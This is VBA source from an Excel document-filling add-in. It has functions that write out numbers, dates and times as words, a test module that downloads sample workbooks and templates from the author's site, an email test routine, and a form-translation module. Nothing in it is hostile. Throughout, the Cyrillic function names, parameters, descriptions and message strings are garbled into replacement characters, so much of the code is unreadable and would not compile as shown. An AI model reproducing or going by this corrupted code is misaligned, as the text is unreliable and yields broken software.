' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| As Long)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = FractionalNumberToText(|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, True)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|, Optional ByVal |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| As Long)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|. \n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 123,45, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 45 |fffd||fffd||fffd||fffd||fffd|"
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = FractionalNumberToText(|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, False)
End Function

' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""8 |fffd||fffd||fffd||fffd||fffd||fffd| 2013 |fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|, , 1)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd| = Propis_Time_RUS(|fffd||fffd||fffd||fffd||fffd|)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""9 |fffd||fffd||fffd||fffd||fffd| 58 |fffd||fffd||fffd||fffd||fffd| 36 |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Time_RUS(|fffd||fffd||fffd||fffd||fffd|, 1)
End Function

Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|, 1)
End Function
Function |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(ByVal |fffd||fffd||fffd||fffd|)
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.\n|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| A1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 08.01.2013 9:58, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|(A1) |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ""8 |fffd||fffd||fffd||fffd||fffd||fffd| 2013 |fffd||fffd||fffd||fffd|, 9 |fffd||fffd||fffd||fffd||fffd| 58 |fffd||fffd||fffd||fffd||fffd| 36 |fffd||fffd||fffd||fffd||fffd||fffd|"""
Attribute |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.VB_ProcData.VB_Invoke_Func = " \n14"
    |fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Propis_Date_RUS(|fffd||fffd||fffd||fffd|, 1, 1)
End Function

Attribute VB_Name = "mod_TestProgram"
'---------------------------------------------------------------------------------------
' Module        : mod_TestProgram                    Version:
' Author        : Igor Vakhnenko                   Date: 08.05.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit

Public Const ExcelTableExample1$ = "ExcelTable.xls"
Public Const ExcelTableExample2$ = "-.xls"
Const TEST_FILE_NAME_LOCAL1$ = "FillDocuments add-in test - source data.xls"
Const TEST_FILE_NAME_LOCAL2$ = "FillDocuments add-in test - another file.xls"

Sub DownloadAndOpenExcelTable1()
    DownloadAndOpenExcelTable 1
End Sub

'Sub DownloadAndOpenExcelTable2()
'    DownloadAndOpenExcelTable 2
'End Sub

Function DownloadAndOpenExcelTable(ByVal ind&) As Boolean
    On Error Resume Next: Dim URL$, filename$, tmpXLSpath$
    URL$ = "http://excelvba.ru/resources/FillDocuments/" & Choose(ind&, ExcelTableExample1$, ExcelTableExample2$)
    filename$ = Choose(ind&, TEST_FILE_NAME_LOCAL1$, TEST_FILE_NAME_LOCAL2$)

    Err.Clear: Workbooks(filename$).Activate
    If Err = 0 Then
        DownloadAndOpenExcelTable = True
        TranslateWorkbook Workbooks(filename$)
        Exit Function
    End If

    tmpXLSpath$ = FWF.temp_folder & filename$

    If FWF.DownLoadFileFromURL(URL$, tmpXLSpath$) Then
        TranslateWorkbook Workbooks.Open(tmpXLSpath$)
        DownloadAndOpenExcelTable = True
    Else
        MsgBox tt("TEST_MSG_ErrorDownloadingWorkbook"), vbCritical, tt("TEST_MSG_ErrorDownloadingWorkbook_Title")
    End If
End Function

Function DownloadPicturesFromWebsite() As Boolean    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    Workbooks(TEST_FILE_NAME_LOCAL1$).Activate
    If Err <> 0 Then MsgBox tt("TEST_MSG_ErrorConnectingTestWorkbook"), vbCritical: Exit Function

    Dim arr: arr = Workbooks(TEST_FILE_NAME_LOCAL1$).Worksheets("download list").Range("DownloadList").value
    If Not IsArray(arr) Then MsgBox tt("TEST_MSG_DownloadListNotFound"), vbCritical: Exit Function

    Dim pi As New ProgressIndicator, i&, res&, fileslist$, msg$
    pi.Show tt("TEST_Download_PI_Caption")
    pi.StartNewAction , , , , , UBound(arr)
    For i = LBound(arr) To UBound(arr)
        pi.SubAction tt("TEST_Download_PI_Line1", "$index", "$count", arr(i, 2))
        res = res - FWF.DownLoadFileFromURL(arr(i, 1), TEMPLATES_FOLDER$ & arr(i, 2))
        fileslist$ = fileslist$ & i & "." & vbTab & arr(i, 2) & vbNewLine
    Next i
    pi.Hide

    DownloadPicturesFromWebsite = res = UBound(arr)

    msg$ = tt("TEST_MSG_DownloadPictures_Result", res & vbNewLine, vbNewLine & fileslist$, vbNewLine & TEMPLATES_FOLDER$)
    MsgBox msg, vbInformation, tt("TEST_MSG_DownloadPictures_ResultTitle")
End Function

Function DownloadTemplatesFromWebsite() As Boolean
    On Error Resume Next
    Dim coll As New Collection, OK As Boolean, tmp_path$, txt$, arr, i&, msg$, URL$, item
    Err.Clear: tmp_path$ = FWF.temp_folder & "template_files.txt"

    URL$ = "http://excelvba.ru/resources/FillDocuments/"
    OK = FWF.DownLoadFileFromURL(URL$, tmp_path$)
    If Not OK Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If
    txt = FWF.ReadTXTfile(tmp_path$)
    arr = Split(txt, "</a>")
    For i = LBound(arr) To UBound(arr)
        arr(i) = Split(arr(i), ">")(UBound(Split(arr(i), ">")))
        If arr(i) Like "*.*" Then
            If arr(i) <> ExcelTableExample1$ Then coll.Add arr(i)
        End If
    Next i

    If coll.Count = 0 Then
        msg = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Function
    End If

    Dim pi As New ProgressIndicator, n As Long, res As Long, fileslist$
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    pi.StartNewAction , , , , , coll.Count

    For Each item In coll
        n = n + 1: pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & item
        res = res - FWF.DownLoadFileFromURL(URL$ & item, TEMPLATES_FOLDER$ & item)
        fileslist$ = fileslist$ & n & "." & vbTab & item & vbNewLine
    Next
    pi.Hide

    DownloadTemplatesFromWebsite = res = coll.Count
    If res = 0 Then DownloadTemplatesFromWebsite = False
    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & res & " |fffd||fffd| " & coll.Count & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & fileslist$ & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & TEMPLATES_FOLDER$
    MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Function


Function UsageExampleMacro1() As Boolean        ' into cells
    On Error Resume Next: Err.Clear
    Workbooks(TEST_FILE_NAME_LOCAL1$).Activate
    If Err <> 0 Then MsgBox tt("TEST_MSG_ErrorConnectingTestWorkbook"), vbCritical: Exit Function
    Range("b2:e4").Select

    SETT.Reset
    SETT.SetText "TextBox_OutputMask", "{|fffd||fffd||fffd|} - {%filename%}.{%ext%}"
    SETT.SetText "CheckBox_CloseProgressBar", True

    CreateAllDocuments
    UsageExampleMacro1 = True
End Function


Sub test_send()
    With New Letters
        With .CreateNewLetter
            .Email = "igor------@mail.ru"
            .Subject = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            .Body = "|fffd||fffd||fffd| &test |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (FillDocuments)"
        End With

        .SendAll_using_API
    End With
End Sub

Attribute VB_Name = "mod_Translate"
'---------------------------------------------------------------------------------------
' Module        : mod_Translate                    Version: 2.2
' Author        : Igor Vakhnenko                   Date: 02.05.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit
Public Const TRANSLATE_SHEET_FIRST_ROW& = 5, DEFAULT_LANGUAGE$ = "en"
Dim DoNotTranslate As Boolean

Function TR_DIC() As Dictionary
    Static objTRDIC As Dictionary
    If Not objTRDIC Is Nothing Then
        Set TR_DIC = objTRDIC: Exit Function
    Else
        Set objTRDIC = New Dictionary: objTRDIC.CompareMode = TextCompare
        PrepareTraslateDictionary
        Set TR_DIC = objTRDIC
    End If
End Function

Sub TranslateUserForm(ByRef UF As Object)
    If DoNotTranslate Then Exit Sub
    On Error Resume Next: Dim ctrl As MSForms.Control, fcaption$
    fcaption$ = tt(UF.Name & "_caption"): If Len(fcaption$) Then UF.Caption = fcaption$
    For Each ctrl In UF.Controls
        UpdateControl ctrl, UF.Name
    Next
End Sub

Sub UpdateControl(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim m_page As Object, id$, res$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            UpdateControl m_page, ParentName$ & "\" & ctrl.Name
        Next
    Else
        id$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
        res$ = tt(id$)
        If Len(res$) Then ctrl.Caption = res$

        If Len(ctrl.Tag) Then
            id$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            res$ = tt(id$)
            If Len(res$) Then ctrl.Tag = res$
        End If

        If Len(ctrl.ControlTipText) Then
            id$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            res$ = tt(id$)
            If Len(res$) Then ctrl.ControlTipText = res$
        End If
    End If
End Sub


' ===================== prepare translations ==========================
